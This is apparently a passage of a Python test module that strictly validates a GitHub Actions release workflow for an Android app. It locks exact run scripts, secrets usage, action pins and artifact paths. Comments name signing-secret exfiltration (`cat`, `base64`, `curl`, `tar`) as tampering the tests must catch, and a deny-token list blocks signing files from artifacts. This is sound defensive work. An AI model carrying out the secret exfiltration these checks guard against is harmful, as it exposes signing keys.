#!/usr/bin/env python3
"""Fast, dependency-free contract tests for .github/workflows/build.yml.

The parser in this module is a deliberately strict *allowlist* for the small
block-style YAML subset the workflow is allowed to use.  It is not a forgiving
YAML implementation: quoted keys, flow collections, anchors/aliases/tags,
heredocs in run scripts, stray secrets tokens and tolerated failures are all
hard errors.  That keeps a reviewer mutation (e.g. turning `uses:` into
`"uses":`, hiding a command behind a here-doc, or commenting out a check) from
silently passing the policy suite.

Behavioral tests extract the real `run:` scripts from the workflow and execute
them against temporary fixtures, including a fake Android SDK whose `apksigner`
records its arguments and can fail on demand.  A no-op mutation therefore fails
both the structural and the behavioral checks.

Standard library only; no PyYAML dependency in CI.
"""

from __future__ import annotations

import hashlib
import os
import re
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = ROOT / ".github" / "workflows" / "build.yml"
TAG_PUSH = "github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')"
SIGNING_SECRETS = {"KEYSTORE", "KEYSTORE_PASSWORD", "KEY_ALIAS", "KEY_PASSWORD"}
ACTION_PINS = {
    "actions/checkout": ("3d3c42e5aac5ba805825da76410c181273ba90b1", "v7"),
    "actions/upload-artifact": ("cf430e030ddbb5b0abf93d22962f4752f3646cd9", "v7"),
    "actions/download-artifact": ("37930b1c2abaa49bbe596cd826c3c89aef350131", "v7"),
    "actions/setup-java": ("d1374f8ac74474200d16ef8ecee22c7ae7a51880", "v6"),
    "gradle/actions/setup-gradle": ("8da46b539cd8fe6ab27ca75128919a18d757604c", "v6"),
    "softprops/action-gh-release": ("8a0cd651e5b2365bd640854a3fa5dfc70e4875f3", "v3"),
}
ALLOWED_SECRETS = {"${{ secrets." + name + " }}" for name in SIGNING_SECRETS}
TEST_CI_COMMANDS = {
    "Run signing regression tests": "bash tests/signing/run_tests.sh",
    "Run signed and unsigned release smoke": 'bash tests/signing/smoke_signed_release.sh "$HOME"',
    "Run workflow policy tests": "python3 tests/workflow/test_policy.py",
}
APK_COUNTER_COMMAND = "Verify APK counts"
ANCESTRY_STEP = "Verify tag is on master"
CLEANUP_STEP = "Clean up signing material"
# Exact, ordered run-script contract for build-release.  Dict insertion order
# is the required order of the run steps.  Every value is the full, exact script
# text (no trailing newline, 2-space shell indentation), compared with equality
# by assert_exact_release_run_scripts.  Nothing is exempt -- cleanup included.
# An appended `cat signing.properties`, `base64`/`curl`/`tar` exfiltration,
# `|| true`, or a no-op `echo` replacement all change the text and fail.
ANCESTRY_SCRIPT = (
    "set -euo pipefail\n"
    "if ! git merge-base --is-ancestor HEAD origin/master; then\n"
    '  echo "Release tag HEAD must be an ancestor of origin/master" >&2\n'
    "  exit 1\n"
    "fi"
)
BUILD_SIGNED_SCRIPT = (
    "set -euo pipefail\n"
    "for attempt in 1 2 3; do\n"
    "  if ./gradlew :app:assembleRelease --no-daemon --console=plain; then\n"
    "    break\n"
    "  fi\n"
    "  if [[ $attempt -eq 3 ]]; then\n"
    '    echo "Gradle build failed after 3 attempts" >&2\n'
    "    exit 1\n"
    "  fi\n"
    '  echo "Gradle build failed (attempt $attempt), retrying in 30s..." >&2\n'
    "  sleep 30\n"
    "done"
)
VERIFY_SIGNED_SCRIPT = (
    "set -euo pipefail\n"
    "shopt -s nullglob\n"
    "apks=(app/build/outputs/apk/release/DFRoot_*.apk)\n"
    "if [[ ${#apks[@]} -ne 1 ]]; then\n"
    '  echo "Expected exactly one release APK, found ${#apks[@]}" >&2\n'
    "  exit 1\n"
    "fi\n"
    "sdk=${ANDROID_HOME:-${ANDROID_SDK_ROOT:-$HOME/Android/Sdk}}\n"
    "apksigner=\n"
    "if [[ -d $sdk/build-tools ]]; then\n"
    '  apksigner=$(find "$sdk/build-tools" -mindepth 2 -maxdepth 2 -type f -name apksigner -print | sort -V | tail -n 1)\n'
    "fi\n"
    'if [[ -z $apksigner || ! -x $apksigner ]]; then\n'
    '  echo "apksigner was not found in the Android SDK" >&2\n'
    "  exit 1\n"
    "fi\n"
    '"$apksigner" verify --verbose --print-certs "${apks[0]}"'
)
PACKAGE_SIGNED_SCRIPT = (
    "set -euo pipefail\n"
    "shopt -s nullglob\n"
    "apks=(app/build/outputs/apk/release/DFRoot_*.apk)\n"
    "if [[ ${#apks[@]} -ne 1 ]]; then\n"
    '  echo "Expected exactly one release APK, found ${#apks[@]}" >&2\n'
    "  exit 1\n"
    "fi\n"
    "apk=${apks[0]##*/}\n"
    "mkdir -p release\n"
    'cp -- "${apks[0]}" "release/$apk"\n'
    "(\n"
    "  cd release\n"
    '  sha256sum -- "$apk" > "$apk.sha256"\n'
    ")"
)
CLEANUP_SCRIPT = (
    "rm -f -- signing.properties keystore.jks .keystore.jks-*.tmp .signing.properties-*.tmp"
)
RELEASE_RUN_SCRIPTS: dict[str, str] = {
    ANCESTRY_STEP: ANCESTRY_SCRIPT,
    "Write signing material": "java scripts/WriteSigningProperties.java ci .",
    "Build signed release APK": BUILD_SIGNED_SCRIPT,
    "Verify signed release APK": VERIFY_SIGNED_SCRIPT,
    "Package signed release APK": PACKAGE_SIGNED_SCRIPT,
    CLEANUP_STEP: CLEANUP_SCRIPT,
}
# Exact ordered step-name contract for every job.  An extra (or reordered, or
# renamed) step is a policy violation, not a harmless addition.
JOB_STEP_NAMES: dict[str, list[str]] = {
    "test-ci": [
        "Check out source",
        "Set up Java 21",
        "Set up Gradle",
        "Run signing regression tests",
        "Run signed and unsigned release smoke",
        "Run workflow policy tests",
    ],
    "build-lkms": [
        "Check out source",
        "Build dfroot.ko",
        "Upload dfroot.ko",
    ],
    "build-dfroot": [
        "Check out source",
        "Set up Java 21",
        "Download DF LKM (android13-5.15)",
        "Set up Gradle",
        "Build debug and release APKs",
        APK_COUNTER_COMMAND,
        "Upload DFRoot APKs",
    ],
    "build-release": [
        "Check out release history",
        ANCESTRY_STEP,
        "Set up Java 21",
        "Write signing material",
        "Download DF LKM (android13-5.15)",
        "Set up Gradle",
        "Build signed release APK",
        "Verify signed release APK",
        "Package signed release APK",
        "Upload signed release",
        CLEANUP_STEP,
    ],
    "publish": [
        "Download signed release",
        "Verify release checksum",
        "Publish release assets",
    ],
}
# Exact multiline artifact paths/files.  These are compared with equality, so
# appending an extra file (e.g. signing.properties) is a hard failure.
CI_UPLOAD_PATH = (
    "app/build/outputs/apk/debug/DFRoot_*.apk\n"
    "app/build/outputs/apk/release/DFRoot_*.apk"
)
RELEASE_UPLOAD_PATH = "release/DFRoot_*.apk\nrelease/DFRoot_*.apk.sha256"
PUBLISH_FILES = "dist/DFRoot_*.apk\ndist/DFRoot_*.apk.sha256"
LKM_UPLOAD_PATH = "out/dfroot-${{ matrix.kmi }}.ko"
FORBIDDEN_ARTIFACT_TOKENS = ("keystore", "signing", ".jks", "..")
EXPR_RE = re.compile(r"\$\{\{.*?\}\}")
BLOCK_HEADER_RE = re.compile(
    r"^(?P<indent> *)(?:- +)?(?P<key>[A-Za-z0-9_-]+):[ ]*(?P<style>[|>])[+-]?[ ]*(?:#.*)?$"
)


# --------------------------------------------------------------------------- #
# Strict, block-scalar-aware YAML subset parser
# --------------------------------------------------------------------------- #
def block_scalar_spans(text: str) -> list[tuple[int, int, int, str]]:
    """Return (header_indent, header_line, end_line_exclusive, key) per block scalar."""
    lines = text.splitlines()
    spans: list[tuple[int, int, int, str]] = []
    index = 0
    while index < len(lines):
        match = BLOCK_HEADER_RE.match(lines[index])
        if not match:
            index += 1
            continue
        indent = len(match.group("indent"))
        end = index + 1
        while end < len(lines):
            line = lines[end]
            if not line.strip():
                end += 1
                continue
            if len(line) - len(line.lstrip(" ")) <= indent:
                break
            end += 1
        spans.append((indent, index, end, match.group("key")))
        index = end
    return spans


def block_scalar_content_lines(text: str) -> set[int]:
    content: set[int] = set()
    for _indent, start, end, _key in block_scalar_spans(text):
        content.update(range(start + 1, end))
    return content


def strip_line_comment(line: str) -> str:
    """Strip a YAML comment from one line, honouring that line's quotes only."""
    output: list[str] = []
    quote: str | None = None
    index = 0
    while index < len(line):
        char = line[index]
        if quote == '"' and char == "\\":
            output.append(char)
            if index + 1 < len(line):
                output.append(line[index + 1])
                index += 2
            else:
                index += 1
            continue
        if quote:
            output.append(char)
            if char == quote:
                if quote == "'" and index + 1 < len(line) and line[index + 1] == "'":
                    output.append(line[index + 1])
                    index += 2
                    continue
                quote = None
        elif char in ("'", '"'):
            quote = char
            output.append(char)
        elif char == "#" and (index == 0 or line[index - 1].isspace()):
            break
        else:
            output.append(char)
        index += 1
    return "".join(output)


def strip_yaml_comments(text: str) -> str:
    """Remove YAML comments without touching block-scalar (shell) content."""
    lines = text.splitlines()
    content = block_scalar_content_lines(text)
    return "\n".join(
        line if index in content else strip_line_comment(line)
        for index, line in enumerate(lines)
    )


def strict_violations(text: str) -> list[str]:
    """Return every construct outside the allowed block-style YAML subset."""
    lines = text.splitlines()
    content = block_scalar_content_lines(text)
    violations: list[str] = []

    for index, line in enumerate(lines):
        if index in content:
            continue  # Block-scalar bodies are opaque shell/literal text.
        probe = EXPR_RE.sub("", strip_line_comment(line))
        if not probe.strip():
            continue
        number = index + 1
        if re.match(r"^\s*[\"'][^\"']+[\"']\s*:", probe):
            violations.append(f"line {number}: quoted YAML key")
        if any(char in probe for char in "{}[]"):
            violations.append(f"line {number}: flow-style mapping/sequence")
        if re.match(r"^\s*<<\s*:", probe):
            violations.append(f"line {number}: YAML merge key")
        mapping = re.match(r"^\s*(?:-\s+)?(?P<key>[A-Za-z0-9_-]+):(?P<rest>.*)$", probe)
        if mapping:
            value = mapping.group("rest").strip()
        else:
            item = re.match(r"^\s*-\s+(?P<rest>.*)$", probe)
            value = item.group("rest").strip() if item else ""
        if re.match(r"^&[A-Za-z0-9_]", value):
            violations.append(f"line {number}: YAML anchor")
        if re.match(r"^\*[A-Za-z0-9_]", value):
            violations.append(f"line {number}: YAML alias")
        if value.startswith("!"):
            violations.append(f"line {number}: YAML tag")

    # Here-docs in run scripts can hide no-op commands from line-based checks.
    for _indent, start, end, key in block_scalar_spans(text):
        if key != "run":
            continue
        for index in range(start + 1, end):
            if "<<" in lines[index]:
                violations.append(f"line {index + 1}: heredoc in run script")
    return violations


def assert_strict_yaml(text: str) -> None:
    violations = strict_violations(text)
    if violations:
        raise AssertionError("strict YAML allowlist violation(s): " + "; ".join(violations))


# --------------------------------------------------------------------------- #
# Small helpers over the parsed subset
# --------------------------------------------------------------------------- #
def scalar(value: str) -> str:
    value = value.strip()
    if len(value) >= 2 and value[0] == value[-1] == "'":
        return value[1:-1].replace("''", "'")
    if len(value) >= 2 and value[0] == value[-1] == '"':
        return value[1:-1]
    return value


def property_value(block: str, key: str, indent: int) -> str | None:
    pattern = rf"^ {{{indent}}}{re.escape(key)}:\s*(.*?)\s*$"
    match = re.search(pattern, block, re.MULTILINE)
    return scalar(match.group(1)) if match else None


def mapping(block: str, key: str, indent: int) -> dict[str, str]:
    header = re.search(rf"^ {{{indent}}}{re.escape(key)}:\s*$", block, re.MULTILINE)
    if not header:
        return {}
    values: dict[str, str] = {}
    lines = block[header.end():].splitlines()
    child_indent = indent + 2
    pattern = rf"^ {{{child_indent}}}([A-Za-z0-9_-]+):\s*(.*?)\s*$"
    index = 0
    while index < len(lines):
        line = lines[index]
        if not line.strip():
            index += 1
            continue
        current_indent = len(line) - len(line.lstrip(" "))
        if current_indent < child_indent:
            break
        match = re.match(pattern, line) if current_indent == child_indent else None
        if not match:
            index += 1
            continue
        name, value = match.groups()
        index += 1
        if value in ("|", "|-", "|+", ">", ">-", ">+"):
            content: list[str] = []
            while index < len(lines):
                continuation = lines[index]
                continuation_indent = len(continuation) - len(continuation.lstrip(" "))
                if continuation.strip() and continuation_indent <= child_indent:
                    break
                content.append(continuation[child_indent + 2:] if continuation.strip() else "")
                index += 1
            values[name] = "\n".join(content).strip()
        else:
            values[name] = scalar(value)
    return values


def job_blocks(active: str) -> dict[str, str]:
    jobs_header = re.search(r"^jobs:\s*$", active, re.MULTILINE)
    if not jobs_header:
        raise AssertionError("workflow has no jobs mapping")
    headings = list(re.finditer(r"^  ([A-Za-z0-9_-]+):\s*$", active[jobs_header.end():], re.MULTILINE))
    jobs: dict[str, str] = {}
    for index, heading in enumerate(headings):
        start = jobs_header.end() + heading.end()
        end = jobs_header.end() + headings[index + 1].start() if index + 1 < len(headings) else len(active)
        jobs[heading.group(1)] = active[start:end]
    return jobs


def steps(block: str) -> list[str]:
    header = re.search(r"^    steps:\s*$", block, re.MULTILINE)
    if not header:
        return []
    result: list[str] = []
    current: list[str] = []
    for line in block[header.end():].splitlines():
        if re.match(r"^      - ", line):
            if current:
                result.append("\n".join(current))
            current = [line]
        elif current:
            current.append(line)
            if line and not line.startswith("      "):
                # A subsequent job key ends the steps sequence.
                result.append("\n".join(current))
                current = []
    if current:
        result.append("\n".join(current))
    return result


def step_property(step: str, key: str) -> str | None:
    normalized = re.sub(r"^      - ", "        ", step, count=1, flags=re.MULTILINE)
    pattern = rf"^        {re.escape(key)}:\s*(.*?)\s*$"
    match = re.search(pattern, normalized, re.MULTILINE)
    return scalar(match.group(1)) if match else None


def run_script(step: str) -> str:
    header = re.search(r"^        run:\s*[|>][-+]?\s*$", step, re.MULTILINE)
    if not header:
        return step_property(step, "run") or ""
    lines: list[str] = []
    for line in step[header.end():].splitlines():
        if line.strip() and not line.startswith("          "):
            break
        lines.append(line[10:] if line.startswith("          ") else "")
    return "\n".join(lines).strip()


def active_script_lines(script: str) -> list[str]:
    """Shell lines that actually execute (blank lines and # comments removed)."""
    return [
        line.strip()
        for line in script.splitlines()
        if line.strip() and not line.strip().startswith("#")
    ]


def action_steps(job: str, action: str) -> list[str]:
    return [step for step in steps(job) if (step_property(step, "uses") or "").startswith(action + "@")]


def named_step(block: str, name: str) -> str:
    matches = [step for step in steps(block) if step_property(step, "name") == name]
    if len(matches) != 1:
        raise AssertionError(f"expected exactly one step named {name!r}, found {len(matches)}")
    return matches[0]


# --------------------------------------------------------------------------- #
# Global, mutation-resistant assertions (each accepts arbitrary workflow text)
# --------------------------------------------------------------------------- #
def assert_no_continue_on_error(text: str) -> None:
    # Any occurrence of the key is forbidden, regardless of its value:
    # `continue-on-error: false`, `${{ true }}`, empty values, etc.  A tolerated
    # step is unsafe even when the value looks harmless today, because a later
    # one-line edit can flip it without touching any other policy check.
    content_lines = block_scalar_content_lines(text)
    for index, line in enumerate(text.splitlines()):
        if index in content_lines:
            continue  # Shell text inside run scripts is not workflow YAML.
        probe = strip_line_comment(line)
        if re.match(r"^\s*continue-on-error\s*:", probe, re.IGNORECASE):
            raise AssertionError(f"line {index + 1}: continue-on-error is not allowed")


def assert_no_secrets_bypass(text: str) -> None:
    # Remove the four exact allowed expressions; anything else mentioning the
    # secrets context (bare `secrets`, `toJSON(secrets)`, `secrets['X']`,
    # different spacing, a token inside a shell comment, ...) is a hard error.
    remaining = text
    for expression in sorted(ALLOWED_SECRETS):
        remaining = remaining.replace(expression, "")
    stray = re.findall(r"\bsecrets\b", remaining, re.IGNORECASE)
    if stray:
        raise AssertionError(f"unexpected secrets context token(s): {stray}")

    active = strip_yaml_comments(text)
    job = job_blocks(active)["build-release"]
    signing = [step for step in steps(job) if step_property(step, "name") == "Write signing material"]
    if len(signing) != 1:
        raise AssertionError("expected exactly one Write signing material step")
    signing_text = signing[0]
    expected_env = {"${{ secrets." + name + " }}" for name in SIGNING_SECRETS}
    if set(mapping(signing_text, "env", 8).values()) != expected_env:
        raise AssertionError("signing env must contain exactly the four allowed secret expressions")
    for expression in sorted(ALLOWED_SECRETS):
        if text.count(expression) != 1 or expression not in signing_text:
            raise AssertionError(f"{expression} must appear exactly once, in Write signing material")


def assert_exact_test_ci_commands(text: str) -> None:
    active = strip_yaml_comments(text)
    job = job_blocks(active)["test-ci"]
    if property_value(job, "if", 4) is not None:
        raise AssertionError("test-ci must not be conditionally skipped")
    for name, command in TEST_CI_COMMANDS.items():
        matches = [step for step in steps(job) if step_property(step, "name") == name]
        if len(matches) != 1:
            raise AssertionError(f"expected exactly one test-ci step named {name!r}")
        step = matches[0]
        if run_script(step) != command:
            raise AssertionError(f"{name} must be exactly: {command}")
        if step_property(step, "if") is not None or step_property(step, "continue-on-error") is not None:
            raise AssertionError(f"{name} must not be skippable or tolerated")


def assert_required_steps_unskippable(text: str) -> None:
    active = strip_yaml_comments(text)
    jobs = job_blocks(active)
    required = {
        "test-ci": list(TEST_CI_COMMANDS),
        "build-dfroot": [APK_COUNTER_COMMAND],
        "build-release": [ANCESTRY_STEP, "Verify signed release APK", "Package signed release APK"],
        "publish": ["Verify release checksum"],
    }
    for job_name, names in required.items():
        for name in names:
            step = named_step(jobs[job_name], name)
            if step_property(step, "if") is not None or step_property(step, "continue-on-error") is not None:
                raise AssertionError(f"{job_name}/{name} must not be skippable or tolerated")


def assert_exact_command_lines(text: str) -> None:
    active = strip_yaml_comments(text)
    jobs = job_blocks(active)
    verify = active_script_lines(run_script(named_step(jobs["build-release"], "Verify signed release APK")))
    for command in (
        'apksigner=$(find "$sdk/build-tools" -mindepth 2 -maxdepth 2 -type f -name apksigner -print | sort -V | tail -n 1)',
        '"$apksigner" verify --verbose --print-certs "${apks[0]}"',
    ):
        if command not in verify:
            raise AssertionError(f"missing exact active apksigner command line: {command}")
    package = active_script_lines(run_script(named_step(jobs["build-release"], "Package signed release APK")))
    if 'sha256sum -- "$apk" > "$apk.sha256"' not in package:
        raise AssertionError("missing exact active package sha256sum command line")
    publisher = active_script_lines(run_script(named_step(jobs["publish"], "Verify release checksum")))
    if 'sha256sum --check "$checksum"' not in publisher:
        raise AssertionError("missing exact active publisher sha256sum command line")
    counter = active_script_lines(run_script(named_step(jobs["build-dfroot"], APK_COUNTER_COMMAND)))
    for command in (
        "shopt -s nullglob",
        "debug=(app/build/outputs/apk/debug/DFRoot_*.apk)",
        "release=(app/build/outputs/apk/release/DFRoot_*.apk)",
        "if [[ ${#debug[@]} -ne 1 || ${#release[@]} -ne 1 ]]; then",
    ):
        if command not in counter:
            raise AssertionError(f"missing exact active APK count command line: {command}")


def assert_exact_step_names(text: str) -> None:
    """Every job must have exactly its allowlisted steps, in that order."""
    jobs = job_blocks(strip_yaml_comments(text))
    if set(jobs) != set(JOB_STEP_NAMES):
        raise AssertionError(
            f"job set must be exactly {sorted(JOB_STEP_NAMES)}, got {sorted(jobs)}"
        )
    for job_name, expected in JOB_STEP_NAMES.items():
        actual = [step_property(step, "name") for step in steps(jobs[job_name])]
        if actual != expected:
            raise AssertionError(
                f"{job_name} step names must be exactly {expected!r}, got {actual!r}"
            )


def assert_exact_release_run_scripts(text: str) -> None:
    """Lock every build-release run script, in order, to its exact text.

    No step is exempt: cleanup is compared with equality just like the rest.
    This is deliberately stronger than a substring/`in` check, so appending an
    exfiltration command (`cat`, `base64`, `curl`, `tar`), a tolerated failure
    (`|| true`), or replacing the ancestry command with a no-op `echo` cannot
    slip through.
    """
    job = job_blocks(strip_yaml_comments(text))["build-release"]
    job_steps = steps(job)
    # Detect run steps by the presence of the `run:` key, not by a non-empty
    # script, so an added (even empty) run key is still caught by the lock.
    run_steps = [step for step in job_steps if step_property(step, "run") is not None]
    actual_names = [step_property(step, "name") for step in run_steps]
    expected_names = list(RELEASE_RUN_SCRIPTS)
    if actual_names != expected_names:
        raise AssertionError(
            f"build-release run steps must be exactly {expected_names!r}, got {actual_names!r}"
        )
    for name, step in zip(expected_names, run_steps):
        expected = RELEASE_RUN_SCRIPTS[name]
        actual = run_script(step)
        if actual != expected:
            raise AssertionError(
                f"build-release/{name} run script must be exactly {expected!r}, got {actual!r}"
            )


def assert_release_scripts_do_not_reference_signing_files(text: str) -> None:
    """Only the cleanup step may mention the private signing files at all."""
    job = job_blocks(strip_yaml_comments(text))["build-release"]
    for step in steps(job):
        if step_property(step, "name") == CLEANUP_STEP:
            # Cleanup is skipped here only because its entire body is locked to
            # the exact rm command by assert_exact_release_run_scripts; it is
            # not a free-form exempt script.
            continue
        script = run_script(step).lower()
        for forbidden in ("keystore.jks", "signing.properties"):
            if forbidden in script:
                raise AssertionError(
                    f"build-release step {step_property(step, 'name')!r} run script "
                    f"must not reference {forbidden!r}"
                )


def assert_safe_artifact_entries(field: str, value: str | None) -> None:
    """Reject secret-bearing or path-traversing artifact entries explicitly."""
    if value is None:
        raise AssertionError(f"artifact {field} is missing")
    for entry in value.splitlines():
        lowered = entry.strip().lower()
        for token in FORBIDDEN_ARTIFACT_TOKENS:
            if token in lowered:
                raise AssertionError(
                    f"artifact {field} entry {entry!r} must not contain {token!r}"
                )


def assert_exact_artifact_inputs(text: str) -> None:
    """Upload paths and the release publish files are exact, closed allowlists."""
    jobs = job_blocks(strip_yaml_comments(text))
    for job_name, expected in (
        ("build-lkms", LKM_UPLOAD_PATH),
        ("build-dfroot", CI_UPLOAD_PATH),
        ("build-release", RELEASE_UPLOAD_PATH),
    ):
        uploads = action_steps(jobs[job_name], "actions/upload-artifact")
        if len(uploads) != 1:
            raise AssertionError(f"{job_name} must have exactly one upload-artifact step")
        path = mapping(uploads[0], "with", 8).get("path")
        assert_safe_artifact_entries("path", path)
        if path != expected:
            raise AssertionError(f"{job_name} upload path must be exactly {expected!r}, got {path!r}")
    releases = action_steps(jobs["publish"], "softprops/action-gh-release")
    if len(releases) != 1:
        raise AssertionError("publish must have exactly one gh-release step")
    files = mapping(releases[0], "with", 8).get("files")
    assert_safe_artifact_entries("files", files)
    if files != PUBLISH_FILES:
        raise AssertionError(f"publish files must be exactly {PUBLISH_FILES!r}, got {files!r}")


def validate_workflow(text: str) -> None:
    assert_strict_yaml(text)
    assert_no_continue_on_error(text)
    assert_no_secrets_bypass(text)
    assert_exact_test_ci_commands(text)
    assert_exact_step_names(text)
    assert_exact_release_run_scripts(text)
    assert_required_steps_unskippable(text)
    assert_exact_command_lines(text)
    assert_release_scripts_do_not_reference_signing_files(text)
    assert_exact_artifact_inputs(text)


# --------------------------------------------------------------------------- #
# Shell fixture helpers for behavioral tests
# --------------------------------------------------------------------------- #
def run_in_dir(script: str, cwd: Path, env_overrides: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    script_path = cwd / "_extracted_script.sh"
    script_path.write_text(script.rstrip() + "\n", encoding="utf-8")
    env = os.environ.copy()
    env.update(env_overrides or {})
    return subprocess.run(
        ["bash", str(script_path)],
        cwd=cwd,
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )


def write_release_apks(root: Path, names: list[str]) -> Path:
    base = root / "app" / "build" / "outputs" / "apk" / "release"
    base.mkdir(parents=True, exist_ok=True)
    for name in names:
        (base / name).write_bytes(f"APK:{name}\n".encode())
    return base


def write_debug_apks(root: Path, names: list[str]) -> Path:
    base = root / "app" / "build" / "outputs" / "apk" / "debug"
    base.mkdir(parents=True, exist_ok=True)
    for name in names:
        (base / name).write_bytes(f"DEBUG:{name}\n".encode())
    return base


def write_dist(root: Path, names: list[str]) -> Path:
    dist = root / "dist"
    dist.mkdir(parents=True, exist_ok=True)
    for name in names:
        data = f"APK:{name}\n".encode()
        (dist / name).write_bytes(data)
        digest = hashlib.sha256(data).hexdigest()
        (dist / (name + ".sha256")).write_text(f"{digest}  {name}\n", encoding="utf-8")
    return dist


def make_fake_sdk(root: Path, exit_code: int) -> tuple[Path, Path]:
    sdk = root / "sdk"
    tool = sdk / "build-tools" / "35.0.0" / "apksigner"
    tool.parent.mkdir(parents=True, exist_ok=True)
    log = root / "apksigner-invocations.txt"
    tool.write_text(
        "#!/usr/bin/env bash\n"
        "set -u\n"
        'printf "%s\\n" "$@" > "$APKSIGNER_LOG"\n'
        f"exit {exit_code}\n",
        encoding="utf-8",
    )
    tool.chmod(0o755)
    return sdk, log


class WorkflowPolicyTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.raw = WORKFLOW.read_text(encoding="utf-8")
        validate_workflow(cls.raw)
        cls.active = strip_yaml_comments(cls.raw)
        cls.jobs = job_blocks(cls.active)

    def test_strict_yaml_allowlist_accepts_the_workflow(self) -> None:
        self.assertEqual(strict_violations(self.raw), [])

    def test_top_level_default_and_explicit_job_permissions_are_least_privilege(self) -> None:
        self.assertEqual(mapping(self.active, "permissions", 0), {"contents": "read"})
        self.assertTrue(self.jobs, "no jobs found")
        for name, job in self.jobs.items():
            with self.subTest(job=name):
                expected = {"contents": "write", "actions": "read"} if name == "publish" else {"contents": "read"}
                if name == "build-release":
                    expected["actions"] = "read"
                self.assertEqual(mapping(job, "permissions", 4), expected)

    def test_every_action_is_exactly_pinned_with_a_version_comment(self) -> None:
        uses_lines = re.findall(r"^\s*(?:-\s+)?uses:\s*(\S+)(?:\s+#\s*(v\d+))?\s*$", self.raw, re.MULTILINE)
        self.assertTrue(uses_lines, "no action steps found")
        for uses, version in uses_lines:
            with self.subTest(uses=uses):
                self.assertIn("@", uses)
                action, sha = uses.rsplit("@", 1)
                self.assertIn(action, ACTION_PINS)
                self.assertEqual((sha, version), ACTION_PINS[action])
                self.assertRegex(sha, r"^[0-9a-f]{40}$")
        active_uses = re.findall(r"^\s*(?:-\s+)?uses:\s*(\S+)\s*$", self.active, re.MULTILINE)
        self.assertEqual(active_uses, [uses for uses, _ in uses_lines])

    def test_every_checkout_disables_persisted_credentials(self) -> None:
        checkouts = [step for job in self.jobs.values() for step in action_steps(job, "actions/checkout")]
        self.assertTrue(checkouts, "no checkout steps found")
        for checkout in checkouts:
            with self.subTest(step=step_property(checkout, "name")):
                self.assertEqual(mapping(checkout, "with", 8).get("persist-credentials"), "false")

    def test_signing_secrets_are_confined_to_the_protected_release_step(self) -> None:
        assert_no_secrets_bypass(self.raw)
        for name, job in self.jobs.items():
            with self.subTest(job=name):
                references = re.findall(r"\$\{\{\s*secrets\.([A-Za-z0-9_]+)\s*\}\}", job)
                if name == "build-release":
                    self.assertEqual(set(references), SIGNING_SECRETS)
                else:
                    self.assertEqual(references, [])

    def test_tag_gates_and_non_cancelling_release_concurrency_are_exact(self) -> None:
        expected_gate = "${{ " + TAG_PUSH + " }}"
        self.assertEqual(property_value(self.jobs["build-release"], "if", 4), expected_gate)
        self.assertEqual(property_value(self.jobs["publish"], "if", 4), expected_gate)
        self.assertEqual(
            property_value(self.jobs["build-dfroot"], "if", 4),
            "${{ !(" + TAG_PUSH + ") }}",
        )
        self.assertEqual(
            mapping(self.active, "concurrency", 0).get("cancel-in-progress"),
            "${{ !startsWith(github.ref, 'refs/tags/v') }}",
        )

    def test_test_ci_precedes_and_gates_ddk_and_runs_all_fast_checks(self) -> None:
        names = list(self.jobs)
        self.assertLess(names.index("test-ci"), names.index("build-lkms"))
        self.assertEqual(property_value(self.jobs["build-lkms"], "needs", 4), "test-ci")
        job = self.jobs["test-ci"]
        self.assertEqual(len(action_steps(job, "actions/checkout")), 1)
        java = action_steps(job, "actions/setup-java")
        self.assertEqual(len(java), 1)
        self.assertEqual(mapping(java[0], "with", 8), {"distribution": "temurin", "java-version": "21"})
        self.assertEqual(len(action_steps(job, "gradle/actions/setup-gradle")), 1)
        assert_exact_test_ci_commands(self.raw)

    def test_no_continue_on_error_and_no_tolerated_required_steps(self) -> None:
        assert_no_continue_on_error(self.raw)
        assert_required_steps_unskippable(self.raw)

    def test_every_job_matches_the_exact_ordered_step_allowlist(self) -> None:
        assert_exact_step_names(self.raw)
        for job_name, expected in JOB_STEP_NAMES.items():
            with self.subTest(job=job_name):
                actual = [step_property(step, "name") for step in steps(self.jobs[job_name])]
                self.assertEqual(actual, expected)

    def test_every_build_release_run_script_is_exact_and_ordered(self) -> None:
        """The full ordered run-script map, cleanup included, is equality-locked."""
        assert_exact_release_run_scripts(self.raw)
        job = self.jobs["build-release"]
        run_steps = [step for step in steps(job) if step_property(step, "run") is not None]
        self.assertEqual(
            [step_property(step, "name") for step in run_steps],
            list(RELEASE_RUN_SCRIPTS),
        )
        for name, step in zip(RELEASE_RUN_SCRIPTS, run_steps):
            with self.subTest(step=name):
                self.assertEqual(run_script(step), RELEASE_RUN_SCRIPTS[name])
        self.assertEqual(
            run_script(named_step(job, CLEANUP_STEP)),
            "rm -f -- signing.properties keystore.jks .keystore.jks-*.tmp .signing.properties-*.tmp",
        )

    def test_release_run_scripts_never_expose_signing_files(self) -> None:
        assert_release_scripts_do_not_reference_signing_files(self.raw)
        mentions = []
        for step in steps(self.jobs["build-release"]):
            script = run_script(step).lower()
            if "keystore.jks" in script or "signing.properties" in script:
                mentions.append(step_property(step, "name"))
        self.assertEqual(mentions, [CLEANUP_STEP])

    def test_artifact_inputs_are_exact_and_free_of_signing_paths(self) -> None:
        assert_exact_artifact_inputs(self.raw)
        for token in FORBIDDEN_ARTIFACT_TOKENS:
            with self.subTest(token=token):
                self.assertNotIn(token, RELEASE_UPLOAD_PATH.lower())
                self.assertNotIn(token, PUBLISH_FILES.lower())
                self.assertNotIn(token, CI_UPLOAD_PATH.lower())

    def test_ddk_stays_digest_pinned_non_privileged_and_uploads_one_ko(self) -> None:
        job = self.jobs["build-lkms"]
        image = mapping(job, "container", 4).get("image", "")
        self.assertRegex(image, r"@sha256:[0-9a-f]{64}$")
        self.assertNotIn("--privileged", self.active)
        upload = action_steps(job, "actions/upload-artifact")
        self.assertEqual(len(upload), 1)
        inputs = mapping(upload[0], "with", 8)
        self.assertEqual(inputs.get("path"), "out/dfroot-${{ matrix.kmi }}.ko")
        self.assertEqual(inputs.get("if-no-files-found"), "error")
        self.assertEqual(inputs.get("overwrite"), "true")

    def test_ci_build_is_read_only_builds_both_variants_and_counts_apks(self) -> None:
        job = self.jobs["build-dfroot"]
        self.assertEqual(property_value(job, "name", 4), "CI DFRoot APKs")
        self.assertEqual(property_value(job, "needs", 4), "build-lkms")
